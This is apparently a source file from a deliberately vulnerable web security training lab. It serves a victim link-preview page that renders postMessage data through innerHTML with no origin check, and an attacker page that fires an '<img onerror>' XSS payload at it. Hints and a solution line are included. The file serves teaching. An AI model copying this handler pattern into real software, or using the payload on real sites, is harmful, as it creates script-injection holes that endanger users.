'use strict';
// Lab 3: message data flows into innerHTML without sanitization. The link
// preview pane renders event.data.html (or the raw message) as HTML, so a
// message carrying markup becomes live markup in the page. The victim page's
// own message handler fires the flag beacon with its page-bound token.
// The award itself lives in the module-level /postmsg/beacon route.
const express = require('express');
const { page, appShell, payloadBlock } = require('../../../lib/page');
const { pmNonce } = require('../shared');

const router = express.Router();

// GET /data-xss -> the victim page: a link preview pane that renders any
// message it receives as HTML.
router.get('/data-xss', (req, res) => {
  res.send(page('Link preview · Previewr', `
    ${appShell('Previewr', `
      <h2>Link preview</h2>
      <p>Other pages can send this pane a preview to render. Whatever arrives shows up below.</p>
      <div class="card" id="preview"><p class="dim">(no preview received yet)</p></div>
      <script>
        // Page-bound token: only a handler running in this loaded page can know it.
        var PM_NONCE = ${JSON.stringify(pmNonce(req, 'data-xss'))};
        window.addEventListener('message', function (e) {
          var html = (e.data && e.data.html) ? e.data.html : String(e.data);
          document.getElementById('preview').innerHTML = html;
          fetch('/postmsg/beacon?v=data-xss&d=' + encodeURIComponent('data-xss:' + String(html).slice(0, 200)) + '&n=' + encodeURIComponent(PM_NONCE));
        });
      </script>
      <p class="dim">In-lab attacker page: <a href="/postmsg/data-xss/attacker">open it</a> and fire the payload.</p>
    `, { nav: ['Docs', 'Embed', 'API'], crumb: 'Link preview widget' })}
  `));
});

// GET /data-xss/attacker -> the in-lab attacker page: embeds the victim pane
// and posts it a message whose html property becomes live markup.
router.get('/data-xss/attacker', (req, res) => {
  res.send(page('Attacker page · Previewr', `
    <div class="clay-card">
      <div class="card-top"><b>Attacker page</b><span class="clay-pill">lab 3</span></div>
      <p>This page embeds the victim preview pane in an iframe and sends it a
      message. The pane renders the message's <code>html</code> property as markup.</p>
      <div class="card"><iframe id="v" src="/postmsg/data-xss" width="100%" height="260" style="border:0" title="Victim preview pane"></iframe></div>
      ${payloadBlock('What the Fire button sends', `iframe.contentWindow.postMessage(\n  { html: '<img src=x onerror="alert(\\'postMessage XSS\\')">' },\n  '*'\n);`)}
      <p><button class="clay-btn clay-btn-primary" id="fire" type="button">Fire payload</button></p>
      <p id="log" class="dim" role="status"></p>
      <script>
        document.getElementById('fire').onclick = function () {
          document.getElementById('v').contentWindow.postMessage(
            { html: '<img src=x onerror="alert(\\'postMessage XSS\\')">' }, '*');
          document.getElementById('log').textContent = 'Payload posted. Check the preview pane above and your flag.';
        };
      </script>
    </div>
    <div class="card">
      <div class="card-top"><b>Claim status</b></div>
      <p id="claim-status-data-xss" class="status status-missing" role="status" data-status-url="/postmsg/claim-status?v=data-xss"><span class="dot" aria-hidden="true"></span><span class="claim-text">Checking claim status...</span></p>
    </div>
  `));
});

module.exports = {
  vuln: {
    id: 'data-xss',
    name: 'Unsanitized Message Data Rendered as HTML',
    difficulty: 'Medium',
    hint: 'The preview pane drops event.data.html straight into innerHTML. The message can be an object, not just a string.',
    hints: [
      "The victim renders event.data as HTML. What if data is a script?",
      "Unsanitized data -> HTML injection. Send an <img onerror>.",
      "The preview renders markup from the message as live HTML. You need an element carrying an event-handler attribute that fires without any user click. Build a payload whose attribute runs the moment the markup is rendered.",
    ],
    tools: 'B, DT',
    how: 'Post {html: "<img src=x onerror=...>"} from the attacker page.',
    link: '/postmsg#data-xss',
    start: 'curl -s http://localhost:3000/postmsg/data-xss | head -20',
  },
  router,
};
